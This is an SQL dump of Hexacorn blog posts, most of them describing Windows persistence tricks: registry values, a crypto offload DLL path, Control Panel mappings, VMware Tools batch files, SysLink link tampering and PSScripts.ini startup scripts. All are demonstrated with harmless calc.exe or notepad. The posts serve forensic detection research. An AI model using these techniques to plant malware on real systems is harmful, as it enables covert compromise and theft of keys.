INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (111, 'Permanent Link to Beyond good ol’ Run key, Part 59', 'Hexacorn', 'January 29, 2017 ', 'In my last post I talked about Bluetooth. I have a mixed luck testing anything related to this technology…\nYou see, there is that one more potential persistence mechanism associated with Bluetooth which I was unable to test successfully. Despite my efforts it didn’t work, but this is probably because I don’t have a proper set up. Perhaps people owning a laptop with the Windows 8 on it (and not Windows 8.1 or newer) could give it a go… It is another documented feature of Windows, so it should work.\nSo… there is a thing called ‘Bluetooth Software Radio Switch Function Prototypes’ described on the Microsoft page here.\nAdding the entry\n\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\\r\n\r\nBTHPORT\\Parameters\\Radio Support\\\r\n\r\nSupportDLL = Path to DLL\n\n\nshould allow vendors to register a DLL that will handle requests to Bluetooth radio to switch it on or off.\nThe Microsoft page provides a link to another page that is describing the sample source code demonstrating to programmers how to build your own supporting DLL. The funny thing is that the demo code uses a different key (BthServ instead of BTHPORT service) than the previous page, and a Unicode path instead of an ANSI path provided in the documentation. Searching for strings within c:\\windows directory I could find references to BTHPORT\\Parameters\\Radio Support and not BthServ\\Parameters\\Radio Support so the documentation is probably okay, and the demo is not.\nWell, in any case. It should work.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/29/beyond-good-ol-run-key-part-59/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (112, 'Permanent Link to Beyond good ol’ Run key – All parts', 'Hexacorn', 'January 28, 2017 ', 'Here are the links to all the ‘Beyond good ol’ Run key’ posts so far. I will try to extract the Registry keys into a CSV soon.\n\nPart 01 – http://www.hexacorn.com/blog/2012/07/23/beyond-good-ol-run-key/”\nPart 02 – http://www.hexacorn.com/blog/2012/09/16/beyond-good-ol-run-key-part-2/”\nPart 03 – http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/”\nPart 04 – http://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/”\nPart 05 – http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/”\nPart 06 – http://www.hexacorn.com/blog/2014/01/10/beyond-good-ol-run-key-part-6-2/”\nPart 07 – http://www.hexacorn.com/blog/2014/02/09/beyond-good-ol-run-key-part-7/”\nPart 08 – http://www.hexacorn.com/blog/2014/02/21/beyond-good-ol-run-key-part-8-2/”\nPart 09 – http://www.hexacorn.com/blog/2014/03/02/beyond-good-ol-run-key-part-9/”\nPart 10 – http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/”\nPart 11 – http://www.hexacorn.com/blog/2014/04/27/beyond-good-ol-run-key-part-11/”\nPart 12 – http://www.hexacorn.com/blog/2014/05/21/beyond-good-ol-run-key-part-12/”\nPart 13 – http://www.hexacorn.com/blog/2014/06/18/beyond-good-ol-run-key-part-13/”\nPart 14 – http://www.hexacorn.com/blog/2014/07/08/beyond-good-ol-run-key-part-14/”\nPart 15 – http://www.hexacorn.com/blog/2014/08/04/beyond-good-ol-run-key-part-15/”\nPart 16 – http://www.hexacorn.com/blog/2014/08/27/beyond-good-ol-run-key-part-16/”\nPart 17 – http://www.hexacorn.com/blog/2014/08/31/beyond-good-ol-run-key-part-17/”\nPart 18 – http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/”\nPart 19 – http://www.hexacorn.com/blog/2014/12/04/beyond-good-ol-run-key-part-19/”\nPart 20 – http://www.hexacorn.com/blog/2015/01/01/beyond-good-ol-run-key-part-20/”\nPart 21 – http://www.hexacorn.com/blog/2015/01/03/beyond-good-ol-run-key-part-21/”\nPart 22 – http://www.hexacorn.com/blog/2015/01/06/beyond-good-ol-run-key-part-22/”\nPart 23 – http://www.hexacorn.com/blog/2015/01/09/beyond-good-ol-run-key-part-23/”\nPart 24 – http://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/”\nPart 25 – http://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-25/”\nPart 26 – http://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-26/”\nPart 27 – http://www.hexacorn.com/blog/2015/02/19/beyond-good-ol-run-key-part-27/”\nPart 28 – http://www.hexacorn.com/blog/2015/02/23/beyond-good-ol-run-key-part-28/”\nPart 29 – http://www.hexacorn.com/blog/2015/03/13/beyond-good-ol-run-key-part-29/”\nPart 30 – http://www.hexacorn.com/blog/2015/04/26/beyond-good-ol-run-key-part-30/”\nPart 31 – http://www.hexacorn.com/blog/2015/05/29/beyond-good-ol-run-key-part-31/”\nPart 32 – http://www.hexacorn.com/blog/2015/09/12/beyond-good-ol-run-key-part-32/”\nPart 33 – http://www.hexacorn.com/blog/2015/10/20/beyond-good-ol-run-key-part-33/”\nPart 34 – http://www.hexacorn.com/blog/2016/02/16/beyond-good-ol-run-key-part-34/”\nPart 35 – http://www.hexacorn.com/blog/2016/03/01/beyond-good-ol-run-key-part-35/”\nPart 36 – http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/”\nPart 37 – http://www.hexacorn.com/blog/2016/03/26/beyond-good-ol-run-key-part-37/”\nPart 38 – http://www.hexacorn.com/blog/2016/05/27/beyond-good-ol-run-key-part-38/”\nPart 39 – http://www.hexacorn.com/blog/2016/05/30/beyond-good-ol-run-key-part-39/”\nPart 40 – http://www.hexacorn.com/blog/2016/06/02/beyond-good-ol-run-key-part-40/”\nPart 41 – http://www.hexacorn.com/blog/2016/07/08/beyond-good-ol-run-key-part-41/”\nPart 42 – http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/”\nPart 43 – http://www.hexacorn.com/blog/2016/07/28/beyond-good-ol-run-key-part-43/”\nPart 44 – http://www.hexacorn.com/blog/2016/08/19/beyond-good-ol-run-key-part-44/”\nPart 45 – http://www.hexacorn.com/blog/2016/08/26/beyond-good-ol-run-key-part-45/”\nPart 46 – http://www.hexacorn.com/blog/2016/09/24/beyond-good-ol-run-key-part-46/”\nPart 47 – http://www.hexacorn.com/blog/2016/09/29/beyond-good-ol-run-key-part-47/”\nPart 48 – http://www.hexacorn.com/blog/2016/10/21/beyond-good-ol-run-key-part-48/”\nPart 49 – http://www.hexacorn.com/blog/2016/11/05/beyond-good-ol-run-key-part-49/”\nPart 50 – http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/”\nPart 51 – http://www.hexacorn.com/blog/2016/11/24/beyond-good-ol-run-key-part-51/”\nPart 52 – http://www.hexacorn.com/blog/2017/01/07/beyond-good-ol-run-key-part-52/”\nPart 53 – http://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/”\nPart 54 – http://www.hexacorn.com/blog/2017/01/16/beyond-good-ol-run-key-part-54/”\nPart 55 – http://www.hexacorn.com/blog/2017/01/18/beyond-good-ol-run-key-part-55/”\nPart 56 – http://www.hexacorn.com/blog/2017/01/19/beyond-good-ol-run-key-part-56/”\nPart 57 – http://www.hexacorn.com/blog/2017/01/27/beyond-good-ol-run-key-part-57/”\nPart 58 – http://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-part-58/”\nPart 59 – http://www.hexacorn.com/blog/2017/01/29/beyond-good-ol-run-key-part-59/\n\n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-all-parts/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (113, 'Permanent Link to Beyond good ol’ Run key, Part 58', 'Hexacorn', 'January 28, 2017 ', 'I stumbled upon this persistence mechanism by chance and its nature is similar to the many I have covered before – the preset applications that are executed when a certain event happens. This time I was checking the Bluetooth Stack applications on a laptop and discovered it could be easily configured to run arbitrary programs. We can assume that many other similar Bluetooth configuration utilities developed by other companies offer similar capabilities.\nI don’t know how many people use Bluetooth on their PC laptops nowadays, but as long as the Bluetooth stack is installed, radio is enabled and applications are installed – the specific events should trigger the execution of preset applications…\nThere are at least two places I found where one could add persistent malware to the Bluetooth configuration settings.\nThe first one is under the SMART tab in General Options:\nDespite efforts I didn’t manage to trigger it, but I don’t have many Bluetooth devices at hand. Perhaps someone will be able to run a QC on this one.\nThe setting is located inside the Registry under the following location:\n\nHKCU\\Software\\Toshiba\\BluetoothStack\\\nV1.0\\Mng\\IasStartAplPath= EXE Path\n\nThe second, is not just one, but it’s actually a group of individual settings assigned to each connection – here is an example of properties of such one connection where I added the c:\\windows\\system32\\notepad.exe to execute anytime the connection is established:\nThis one works for sure and it was easy to test it.\nThe location of these settings is as follows:\n\nHKCU\\Software\\Toshiba\\BluetoothStack\\\nV1.0\\EZC\\DATA\\1001\\SCORIGINAL\nAPPEXECUTE=hex:01\nAPPFILEPATHBYTECNT=dword:<Path Length in bytes>\nAPPFILEPATH=hex:<Path expressed as a sequence of hexadecimal numbers>\nAPPFILEPATH2=EXE Path represented as a string\nPSM=dword:0000000f\nSECURITY=dword:00000001\n\nThe key DATA\\1001\\SCORIGINAL changes to DATA\\1002\\SCORIGINAL for the second connection and increases for subsequent connections. This is how it looks like inside the Registry:\n\nIt’s pretty simple, but it’s also not very convincing – I don’t think we should expect a flood of malware using it. Still, worth documenting.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-part-58/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (114, 'Permanent Link to Beyond good ol’ Run key, Part 57', 'Hexacorn', 'January 27, 2017 ', 'The best persistence mechanisms are these that are well documented. They work perfectly and are often compatible with many versions of Windows. Here’s a story of one.\nAccording to Microsoft’s page, the OffloadModExpo function offloads modular exponentiation from a CSP to a hardware accelerator.\nWe don’t really care too much what it means other than it has something to do with the crypto**, and that the function is exported by a plug-in-like DLL that is loaded from the path specified in the following location:\nHKLM\\Software\\Microsoft\\Cryptography\\\r\nOffload\\ExpoOffload = DLL Path\nYup. It’s that simple.\nAdd the key, add the DLL. It doesn’t even need to export the OffloadModExpo function.\nThe only question remaining is when.\nThe answer is – pretty much all the time.\nThe library is loaded by either dssenh.dll, or rsaenh.dll and these libraries provide crypto services to pretty much any possible software running on Windows. At some stage it’s loaded by svchost.exe, iexplore.exe (f.ex. when you visit https:// page), mscorsvw.exe, taskhostw.exe, sdiagnhost.exe and other processes.\nHere’s an example log from promcon immediately after I added the .reg file that installs a rogue DLL (soon after more processes pick it up):\nand the debug view log confirming the loading:\n\n \n**Bonus:\nLast, but not least – the very same thing was described in 2000 as a vulnerability; apparently the DLL will receive all the private keys used by the Crypto API \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/27/beyond-good-ol-run-key-part-57/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (115, 'Permanent Link to Hunting for a better hex dump tool', 'Hexacorn', 'January 23, 2017 ', 'Many command line tools are written with an ancient 80×25 terminal size in mind and as such their output is often limited (at least, for a current standard). This is quite amazing that a concept of writing tools destined for such a small terminal is so omnipresent given the fact high resolution computer screens, as well as dual- and multi- monitor setups are now such a common thing.\nWith this in mind a few years ago I coded a simple hex dump tool which I now use quite often – it gives me a better output than a typical hexdump, and… it was a fun exercise to do. The script is written in perl, fully portable (no dependencies) and… it can for sure be a) buggy b) improved in many ways – use at your own risk \nThe idea that I came with was based on a large amount of unused space I have observed on my terminal (one that I use on Windows). It is typically at least 140×50 and even more, when needed. As such, the 80 columns used by the standard hex dump tool leaves an empty space of at least 70 characters…\nLet’s have a look at cygwin’s hexdump ran in a canonical mode:\nI had an idea that this gap could be utilized to present more data. So, my script prints the output similar to the canonical output of hexdump, plus a bonus. The bonus includes:\n\nthe data decimal offset\nextracted strings (both ANSI and wide) that start within the current line\n\nThe output looks like this:\nIsn’t that cool?\nYou can immediately copy many of the strings to clipboard w/o using strings tool.\nThis is how to run the script:\nperl hex.pl <filename>\r\nperl hex.pl -s <filename>\r\nperl hex.pl -S <filename>\r\nwhere:\r\n-s - extract strings\r\n-S - extract strings, and skip output lines w/o strings\nYou can download the script here.\nIf you find any bugs or run into any issue, please let me know.\nShare this :)', 'hex.pl, Reversing, Software Releases', 'http://www.hexacorn.com/blog/2017/01/23/hunting-for-a-better-hex-dump-tool/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (116, 'Permanent Link to This is not an EXE, this is not a DLL, This is a Windows App', 'Hexacorn', 'January 21, 2017 ', 'I normally don’t pay much attention to Windows apps, but since I knew calc.exe is just a dumb redirector that loads a Calculator app I eventually got curious and loaded the app into IDA. What caught my eye immediately was a number of exported functions:\n\nDllGetActivationFactory\nDllCanUnloadNow\nVSDesignerDllMain\n\n\nWhen I queried my test win10 system for executables that contain these strings I discovered that pretty much all of them are Windows Apps. I then googled around trying to find out if there is any mention of these functions online, and in particular, how they are being used. I didn’t find anything interesting, but found some references, including this excerpt from an automatically  generated build file:\n#if (defined(_M_IX86) || defined(_M_AMD64)) && !defined(_VSDESIGNER_DONT_LOAD_AS_DLL)\r\n#if defined(_M_IX86)\r\n#pragma comment(linker, \"/EXPORT:DllGetActivationFactory=_DllGetActivationFactory@8,PRIVATE\")\r\n#pragma comment(linker, \"/EXPORT:DllCanUnloadNow=_DllCanUnloadNow@0,PRIVATE\")\r\n#pragma comment(linker, \"/EXPORT:VSDesignerDllMain=_VSDesignerDllMain@12,PRIVATE\")\r\n#pragma comment(linker, \"/INCLUDE:___refMTAThread\")\r\n#elif defined(_M_AMD64)\r\n#pragma comment(linker, \"/EXPORT:DllGetActivationFactory=DllGetActivationFactory,PRIVATE\")\r\n#pragma comment(linker, \"/EXPORT:DllCanUnloadNow,PRIVATE\")\r\n#pragma comment(linker, \"/EXPORT:VSDesignerDllMain,PRIVATE\")\r\n#pragma comment(linker, \"/INCLUDE:__refMTAThread\")\r\n#endif\nSo, looks like the building script depends on the _VSDESIGNER_DONT_LOAD_AS_DLL variable. I installed the latest Visual Studio trial version and queried all files for the ‘VSDesignerDllMain’ and ‘_VSDESIGNER_DONT_LOAD_AS_DLL’ strings… and didn’t get many results either…\nJust a few files:\n\nMicrosoft.VisualStudio.DesignTools.Utility.dll\nMicrosoft.VisualStudio.TestPlatform.BuildTasks.dll\nMicrosoft.Windows.UI.Xaml.81.Build.Tasks.dll\nMicrosoft.Windows.UI.Xaml.Build.Tasks.dll\n\nTheir code didn’t really explain much (none of them actually refer to code using the ‘VSDesignerDllMain’ function, only generate files containing references to it).\nSo, I am curious what is the purpose of these functions… either some legacy tool, or some internal testing platform? ‘VSDesigner’ suggests IDE integration of some sort – potentially quicker way to debug the app? Anyway, just guessing here…  If you are a Windows App programmer, or spent more time on reversing Apps and know how these are being used I’d be grateful if you could share.\nIn terms of code, the function simply calls the _DllMainCRTStartup function after setting the internal variable VSDesignerDllMain_status to 3, the DllMainCRTStartup eventually calls DllMain function:\nSo, we have 2 entry points – one for the Windows exe (‘start’) and the second one for the DLL (‘VSDesignerDllMain’->’DllMain’)\nIn the mean time, a typical Windows App is like a Frankenstein’s monster – it is a MZ DOS executable, a PE executable & DLL in one, a .NET assembly, a HTML/XAML madness, and… it can’t be even launched directly from the Explorer, because it needs to be activated via one of the 3 methods offered by the IApplicationActivationManager COM interface (AFAIK, not sure if there is any other way). While the plot thickens the platform gets more and more complicated and reversing work harder and harder…\nShare this :)', 'Reversing', 'http://www.hexacorn.com/blog/2017/01/21/this-is-not-an-exe-this-is-not-a-dll-this-is-a-windows-app/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (117, 'Permanent Link to Beyond good ol’ Run key, Part 56', 'Hexacorn', 'January 19, 2017 ', 'Every once in a while I describe a persistence mechanism that is just plain silly. This is one of these cases.\nThe user interface of Windows applications has not changed much since Windows 3.xx. The same window classes utilized by the same frameworks are being leveraged by a large number of applications. And as these frameworks evolve the capabilities offered to UI designers are visibly improving. Somewhere there, sandwiched between the ugly Delphi buttons from the 90s and the annoying Microsoft’s ribbon of the noughties – a SysLink control appeared. The control became popular pretty quickly as it accepts a very primitive form of a HTML language syntax (so primitive that it’s just an anchor tag <a href=link id=ID>Link</a> ) to define a clickable link (or a number of them).\nThe idea behind this was to make a life easy for developers who saw the progression of HTML-based controls, but didn’t want to bother with the cumbersome task of embedding the WebBrowser container on their dialogs just to create a simple web link. SysLink delivers, and link-like UI elements all now over the place. Interestingly, there is a lot of variants of this class (or, there are a lot of classes designed by different authors and frameworks that implement such functionality). The Visual C offers ‘ATL:<hexadecimal numbers>’ class f.ex. ‘ATL:00D52128’, or ‘ATL:0107E1C8’. Other applications and frameworks may use different classes – a good example is Sysinternals tools – there, the class is just a regular ‘Static’ (that responds to a click), or in some of its tools (f.ex. procmon) a class is called ‘HyperlinkClass’.\nNot all of these classes have a property that I want to talk about (‘HyperlinkClass’ doesn’t).\nTwo examples of SysLinkish classes follow (all the links on the screenshots are implemented in a similar way):\n\n\nAs I mentioned, the aforementioned SysLink class became at some stage omnipresent and many Windows programs and applets still rely on it when they show a helpful link, or two. When clicked, such link typically leads to a help page, or opens a browser to redirect a user to one of many KB articles on Microsoft web site. The control is used by many applications as well.\nBefore I explain the trick that can be used to establish a very lame persistence let me add one more important thing here. There are two ways of handling the events from the SysLink controls. There is a first one, in which the window’s procedure handles the incoming notifications and reacts to them (f.ex. it calls WinExec, or ShellExecute function), and the second one – where a SysLink control interprets the quasi-HTML code and opens the link specified by the anchor’s href parameter on its own. The latter is of our interest as it doesn’t require modification of the code.\nIt’s now time to demonstrate how we can abuse the SysLink control and the following example will show exactly this.\nWhen you run Windows Defender’s executable c:\\Program Files\\Windows Defender\\MSASCui.exe on Windows 10, you may be be shown the following window:\n\nDo you see the ‘Privacy Statement’ or ‘Learn more’ links? They are created by the SysLink’s cousin: ‘ATL:<hexadecimal numbers>’ class (and in my testing instance it is ‘ATL:00D52128’).\nWhen we check the properties of the window ‘hosting’ the link (using f.ex. WinExplorer from Nirsoft) we can observe that the link is indeed provided directly as a window text and includes an anchor:\n\n<A HREF=”https://go.microsoft.com/fwlink/?LinkId=521839″>Privacy Statement</A>\n\n\nThis is promising.\nWe can use WinExplorer again – this time to modify the link to ‘<A HREF=”file://c:\\windows\\system32\\calc.exe”>Privacy Statement</A>’.\nYou see where it is going? \n\nWhat happens now when we click that ‘Privacy Statement’ link?\nYup. The Calculator is launched.\nThis is ‘how’.\nLet’s discuss now ‘where’.\nThe SysLink (and its cousins) can be defined in many places:\n\nCan be created dynamically using a WC_LINK class – this is not interesting as we don’t want to modify the code + binaries are often signed\nIt can be defined directly inside the dialog resources of the executable (f.ex. look for “SysLink” class) – same issues as above\nMUI files – this could be potentially interesting (it is not signed so it can be modified freely)\n\nIn order to establish a ‘real’ persistence, the original non-malicious link has to be found first, and then replaced. As mentioned – the replacement is pretty hard for the actual EXE, or DLL resources as they are typically signed these days. But MUI files are not.\nSo, provided that:\n\nThe program using MUI files can be found\nThe control interprets the SysLinkish markup language (the anchor definition)\nThe control does not process notification messages; instead the SysLinkish control processes the markup language on its own launching the links as it is defined by the anchor\n\nand of course\n\nThe program is quite popular and there are high chances of the user clicking the link after all\n\nthe actual persistence can be achieved…\nRight. I doubt we will ever see it being used in a real attack as it is just too convoluted. it could be thought of as a ‘last resort’ solution for a potential reintroduction of malware on the system.\nAnd yes, it’s plain silly. I told you so.\nOkay… the chances of actually make it work can be improved. Searching for Unicode ‘http://go.microsoft.com/fwlink’ string inside the c:\\WINDOWS\\System32\\en-US\\ folders shows at least 60 files. Having such redirection all over the place could eventually lead to re-infection.\nLast, but not least – the SysLink control may not be such a good target to be abused as a) it is a bit of a dying breed (old dialogs are replaced by HTML-based forms) b) not that many people click links (f.ex. how many times did you actually click the ‘Privacy Statement’ link?), but as far as I know it’s free from any HTML control restrictions. And yes, since nowadays lots of UI is designed using HTML forms it is a possible avenue for further exploration…\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/19/beyond-good-ol-run-key-part-56/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (118, 'Permanent Link to Beyond good ol’ Run key, Part 55', 'Hexacorn', 'January 18, 2017 ', 'The flexibility offered by the Registry comes with a price. Whoever is in a position to change the Registry keys or its values can affect not only the way OS works, but also adjust the functionality of many programs relying on some particular settings. If we talk about persistence, there is yet another location that may be abused for this purpose. The trick I am going to describe is actually very old, but with the intention to document as many persistence mechanisms as possible nothing should be omitted. Plus, it still works on win 10.\nLooking at the following location:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\\nCurrentVersion\\Explorer\\MyComputer\n\nwe can quickly guess that the keys listed underneath refer to a couple of utility tools that Windows occasionally runs:\nExploring them we can find out that the settings are mapped to the following locations:\n\nBackupPath = %SystemRoot%\\system32\\sdclt.exe\ncleanuppath = %SystemRoot%\\System32\\cleanmgr.exe /D %c\nDefragPath = %systemroot%\\system32\\dfrgui.exe\n\nObviously, replacing these settings with your own (read: malware) will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity (or, the user triggers it – see example below).\nThe easiest way to test this particular persistence mechanism is by replacing the entry for the CleanupPath; since this is a path pointing to the tool that will be executed when you click the Disk Cleanup on a drive, the replacement tool will be executed immediately after clicking the button (in my case it’s just a calculator):\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2017/01/18/beyond-good-ol-run-key-part-55/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (119, 'Permanent Link to Beyond good ol’ Run key, Part 54', 'Hexacorn', 'January 16, 2017 ', 'The need to test modules and the will to support legacy stuff have one thing in common – at least on Windows. These functions are heavily integrated with the system and both offer lots of various built-in mechanisms that can be used as an uncommon persistence mechanism. I have already described many of them, but recently I came across yet another legacy settings that we can add to our ‘dodgy autostart’ repertoire.\nLet me introduce you to so-called Legacy CPL Mapping.\nIt is available since at least Windows 7, works under win10, and… it has to do with the way Control Panel Applets are launched; speaking pragmatically – there is a setting in Registry that helps to handle legacy Control Panel Applets.\nThe setting is stored in the following location:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nControl Panel\\Legacy CPL Map\n\nBy opening a number of CPL files and filtering procmon logs to focus on the ‘Legacy CPL Map’ keys only we can quickly confirm that anytime the .cpl file is launched, the system ‘talks’ to the Registry to check the respective ‘Legacy CPL Map’ setting for the applet:\nThe keys stored underneath include names of the Control Panel applets, and can be CPL names (f.ex. main.cpl), canonical names (f.ex.: Microsoft.PowerOptions, Microsoft.EaseOfAccessCenter), or DLLs (f.ex. ntvdmcpl.dll /this is the one that actually led me to this discovery/).\nEach key represent the legacy setting for a given applet and can contain one of two values:\n\nAppletCanonicalName\nShellExecute\n\nThe first is a canonical name of the applet we wish to replace the legacy applet with (f.ex. could use ‘Microsoft.PowerOptions’). The name is then used by the IOpenControlPanel::Open method to launch the mapped applet.\nThe second is just a command line that will be passed to ShellExecuteEx function.\nObviously, both can be abused.\nLet’s have a look at the easy one – the ShellExecute.\nThe settings:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nControl Panel\\Legacy CPL Map\\Microsoft.PowerOptions\\ShellExecute\n\nare being accessed when we click the ‘Additional Power Settings’ button under Settings\\Power & Sleep:\n\nBy setting this value to calc.exe, we will launch the Calculator anytime someone tries to launch these settings:\n\nThis is what procmon sees when we click the button:\n\nOf course, relying on Power Options is probably not enough – some users don’t touch it all. But… There is plenty of other .cpl files to look at…\n\nc:\\WINDOWS\\system32\\appwiz.cpl\nc:\\WINDOWS\\system32\\bthprops.cpl\nc:\\WINDOWS\\system32\\desk.cpl\nc:\\WINDOWS\\system32\\Firewall.cpl\nc:\\WINDOWS\\system32\\FlashPlayerCPLApp.cpl\nc:\\WINDOWS\\system32\\hdwwiz.cpl\nc:\\WINDOWS\\system32\\inetcpl.cpl\nc:\\WINDOWS\\system32\\intl.cpl\nc:\\WINDOWS\\system32\\irprops.cpl\nc:\\WINDOWS\\system32\\joy.cpl\nc:\\WINDOWS\\system32\\main.cpl\nc:\\WINDOWS\\system32\\mmsys.cpl\nc:\\WINDOWS\\system32\\ncpa.cpl\nc:\\WINDOWS\\system32\\powercfg.cpl\nc:\\WINDOWS\\system32\\sysdm.cpl\nc:\\WINDOWS\\system32\\TabletPC.cpl\nc:\\WINDOWS\\system32\\telephon.cpl\nc:\\WINDOWS\\system32\\timedate.cpl\nc:\\WINDOWS\\system32\\wscui.cpl\n\nAnother interesting feature: one could add ‘c:\\WINDOWS\\system32\\powercfg.cpl’, or any other .cpl to one of the standard Startup locations and it will never raise suspicion since it’s a Microsoft-signed binary. Once the Startup entry is launched, the calc.exe (or possible malware) will pop up!\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/16/beyond-good-ol-run-key-part-54/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (120, 'Permanent Link to Beyond good ol’ Run key, Part 53', 'Hexacorn', 'January 14, 2017 ', 'Most of the persistence methods described in this blog series so far focused on the old-school assumption that the system is a typical ‘bare metal’ Windows host. Over last couple of years many hosts are no longer real, and VDIs and Guest OS technologies they rely on introduce new techniques that attackers and malware can potentially use to stay persistent on the system. The features that are designed to support work of VDI may as well serve a malicious purpose. And this is what this post is about.\nI will describe the example of VMWare Workstation as it is easy to test with, but it applies to VM server/cluster technologies as well.\nVMWare Workstation is one of the most popular VM products on the market. Among many rich features that it offers, it is also including a well-documented mechanism that leverages a number of batch files that are executed when the power state of the guest OS changes – these states are:\n\nPower On\nPower Off\nSuspend\nResume\n\nAnyone who does reverse engineering for living uses these features all the time. VMs are an excellent solution to ‘freeze’ the session, test some code path, and revert to the previous snapshot if the code ‘escapes’ or program exits/crashes. It speeds up the analysis a lot and allows us to work in a comfort zone no other reversing tools can typically provide.\nThe VMware Workstation stores its batch files inside the c:\\Program Files\\VMware\\VMware Tools\\ directory – exploring this location we can quickly find a number of interesting files:\n\nc:\\Program Files\\VMware\\VMware Tools\\poweroff-vm-default.bat\nc:\\Program Files\\VMware\\VMware Tools\\poweron-vm-default.bat\nc:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\nc:\\Program Files\\VMware\\VMware Tools\\suspend-vm-default.bat\n\nThe top of the files typically states that:\n@REM ########################################################################\r\n@REM # DO NOT modify this file directly as it will be overwritten the next\r\n@REM # time the VMware Tools are installed. \r\n@REM ########################################################################\nbut of course, we are not going to listen.\nModification of these files can provides a decent persistence mechanism. Obviously, re-installing the VMTools and/or reverting to a previous snapshots can mitigate it, but if the VDI host is indeed running for a long time, this could be a possible good place to run something malicious from. In the VDI farm/cluster scenario, anyone who cans modify the source code of a vmware tools baseline could establish such persistent mechanism on (and infect) the whole cluster (deployment to all nodes).\nInterestingly, these batch files can serve another purpose: they can cause some DoS annoyance (for a lack of a better name as it’s hardly an anti-vm trick). Adding a simple ‘pause’ command to any of these files will ‘prevent’ the VMWare from executing the state-changing operation as it will wait for the cmd.exe process that handles the ‘pause’ command to exit:\n\nSince ‘pause’ requires pressing the key and the script is running in a different session the vmtoold.exe will just enter a sort of never-ending loop. The side-effect of it is that the user won’t be able to f.ex. ‘suspend’ or ‘power off’ the guest system.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (121, 'Permanent Link to Beyond good ol’ Run key, Part 52', 'Hexacorn', 'January 7, 2017 ', 'When you google for “PSScripts.ini” you will find only around 200 results or so. This is a bit surprising, given the fact Microsoft documents this Powershell-based persistence mechanism on their web page for quite some time and even describes in detail the syntax of the PSScripts.ini file. Let alone the fact the mechanism – a close cousin of scripts.ini which I described in the past – is available on Windows 7 and Windows 2008 Server R2 for many years…\nTo access the configuration of the PSScripts.ini we can launch gpedit.msc and find the familiar settings:\nClicking ‘Startup’ or ‘Shutdown’ properties will open a new dialog box where we can see two tabs: one for scripts.ini (Windows Startup Scripts) and the second one for PSScripts.ini (PowerShell Startup Scripts):\nThe information provided at the bottom of the dialog confirms that ‘PowerShell scripts require at least Windows 7 or Windows Server 2008 R2’ – not a big problem nowadays.\nIf we now add our own test script called malware.ps1:\n\nwe will notice that a number of artifacts have been added to the system:\n\nc:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini\n\n[Startup]\r\n0CmdLine=malware.ps1\r\n0Parameters=\n\nc:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\malware.ps1 (this is the test script; it just waits for a key to be pressed)\n\n$null = $Host.UI.RawUI.ReadKey(\'NoEcho,IncludeKeyDown\');\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nGroup 